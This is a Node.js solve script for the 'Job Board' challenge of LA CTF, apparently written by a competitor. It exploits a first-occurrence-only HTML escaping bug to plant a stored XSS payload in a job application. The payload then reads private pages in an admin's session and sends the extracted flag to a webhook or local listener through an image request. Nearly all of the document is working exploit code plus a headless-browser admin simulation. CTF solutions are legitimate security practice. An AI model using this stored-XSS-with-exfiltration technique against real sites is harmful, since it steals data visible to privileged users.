```
#!/usr/bin/env node
/**
 * CTF Solve Script for "Job Board" (LA CTF)
 *
 * ==================== VULNERABILITY ====================
 * htmlEscape() uses String.replace(string, string) which only replaces
 * the FIRST occurrence of each special character (<, >, ", ', &).
 * This is a JS translation bug — Python's str.replace() replaces ALL.
 *
 * By prefixing input with "<>" we "consume" the first < and > escapes,
 * leaving subsequent <script> tags completely intact → Stored XSS.
 *
 * ==================== ATTACK FLOW ====================
 * 1. Submit job application with XSS payload in "why" field
 * 2. Send application URL to admin bot
 * 3. Admin bot logs in (gets session cookie) → visits our application
 * 4. XSS fires: fetches "/" (homepage shows private jobs to admin)
 * 5. Fetches each job page, regex-extracts the flag, exfiltrates it
 *
 * ==================== USAGE ====================
 * LOCAL TEST:
 *   ADMINPW=test123 node solve.js
 *
 * REMOTE (submit URL to admin bot manually):
 *   CHALLENGE_URL=https://job-board.chall.example.com \
 *   WEBHOOK=https://webhook.site/YOUR-UUID \
 *   node solve.js
 */

const http = require('http');
const https = require('https');
const { URL, URLSearchParams } = require('url');

// ==================== CONFIG ====================
const CHALLENGE_URL = process.env.CHALLENGE_URL || 'http://127.0.0.1:3000';
const WEBHOOK = process.env.WEBHOOK || null;
const LISTEN_PORT = 4444;
const EXFIL_URL = WEBHOOK || `http://127.0.0.1:${LISTEN_PORT}`;

// ==================== HELPERS ====================
function httpGet(url) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const mod = u.protocol === 'https:' ? https : http;
    mod.get(u, (res) => {
      let d = '';
      res.on('data', (chunk) => d += chunk);
      res.on('end', () => resolve(d));
    }).on('error', reject);
  });
}

function httpPost(url, body) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const mod = u.protocol === 'https:' ? https : http;
    const data = new URLSearchParams(body).toString();
    const req = mod.request(u, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    }, (res) => {
      let d = '';
      res.on('data', (chunk) => d += chunk);
      res.on('end', () => resolve(d));
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

// ==================== EXPLOIT ====================
async function solve() {
  console.log(`[*] Target:    ${CHALLENGE_URL}`);
  console.log(`[*] Exfil to:  ${EXFIL_URL}\n`);

  // --- Build XSS payload ---
  // The "<>" prefix consumes the first < and > escapes from buggy htmlEscape().
  // The <script> tag and its contents survive unescaped.
  // JS uses backticks (template literals) to avoid " and ' which get first-occurrence escaped.
  const xssPayload = [
    '<>',
    '<script>',
    'fetch(`/`)',
    '.then(r=>r.text())',
    '.then(h=>{',
    'let m=[...h.matchAll(/\\/job\\/[\\w-]+/g)];',
    'Promise.all(m.map(x=>fetch(x[0]).then(r=>r.text())))',
    '.then(ps=>{',
    'let a=ps.join();',
    'let r=a.match(/lactf\\{[^}]+\\}/);',
    `if(r){new Image().src=\`${EXFIL_URL}/?\`+encodeURIComponent(r[0])}`,
    '})',
    '})',
    '</script>',
  ].join('');

  // --- Get a valid job ID from the homepage ---
  const homepage = await httpGet(`${CHALLENGE_URL}/`);
  const jobMatch = homepage.match(/\/job\/([\w-]+)/);
  if (!jobMatch) {
    console.error('[!] No jobs found on homepage');
    process.exit(1);
  }
  console.log(`[*] Target job: ${jobMatch[1]}`);

  // --- Submit application with XSS ---
  const appResponse = await httpPost(`${CHALLENGE_URL}/application/${jobMatch[1]}`, {
    name: 'hacker',
    email: 'hacker@hack.com',
    why: xssPayload,
  });

  const appMatch = appResponse.match(/\/application\/([\w-]+)/);
  if (!appMatch) {
    console.error('[!] Failed to create application');
    process.exit(1);
  }
  const applicationUrl = `${CHALLENGE_URL}/application/${appMatch[1]}`;
  console.log(`[*] Application: ${applicationUrl}\n`);

  // --- Remote mode: just print URL for admin bot ---
  if (WEBHOOK) {
    console.log(`[*] Send this URL to the admin bot:\n`);
    console.log(`    ${applicationUrl}\n`);
    console.log(`[*] Then check your webhook at ${WEBHOOK}`);
    console.log(`[*] The flag will appear in the query string`);
    return;
  }

  // --- Local mode: start listener + simulate admin bot ---
  console.log(`[*] Starting exfil listener on :${LISTEN_PORT}...`);

  const flagPromise = new Promise((resolve) => {
    const server = http.createServer((req, res) => {
      const url = new URL(req.url, `http://127.0.0.1:${LISTEN_PORT}`);
      const raw = url.search.slice(1);
      if (raw) {
        const decoded = decodeURIComponent(raw);
        console.log(`\n${'='.repeat(50)}`);
        console.log(`[FLAG] ${decoded}`);
        console.log(`${'='.repeat(50)}\n`);
        resolve(decoded);
        setTimeout(() => { server.close(); process.exit(0); }, 500);
      }
      res.writeHead(200, { 'Access-Control-Allow-Origin': '*' });
      res.end('ok');
    });
    server.listen(LISTEN_PORT);
  });

  console.log(`[*] Launching headless browser as admin bot...\n`);

  try {
    const puppeteer = require('puppeteer');
    const browser = await puppeteer.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    });
    const page = await browser.newPage();

    // Admin login
    await page.goto(`${CHALLENGE_URL}/login`);
    await page.waitForSelector('[name=username]');
    await page.type('[name=username]', 'admin');
    await page.type('[name=password]', process.env.ADMINPW || 'test123');
    await Promise.all([
      page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 10000 }).catch(() => {}),
      page.click('[type=submit]'),
    ]);
    console.log('[+] Admin logged in');

    // Visit malicious application → XSS fires
    await page.goto(applicationUrl);
    console.log('[+] Visiting application (XSS executing...)');
    await page.waitForNetworkIdle({ timeout: 10000 }).catch(() => {});

    await Promise.race([
      flagPromise,
      new Promise((_, rej) => setTimeout(() => rej('Timeout waiting for flag'), 15000)),
    ]);

    await browser.close();
  } catch (e) {
    if (e.code === 'MODULE_NOT_FOUND') {
      console.log('[!] Puppeteer not installed. Run: npm install puppeteer');
      console.log(`[*] Or manually: login as admin then visit ${applicationUrl}`);
      await flagPromise;
    } else {
      console.error('[!] Error:', e.message || e);
    }
  }
}

solve().catch(console.error);
```

solved by vicevirus
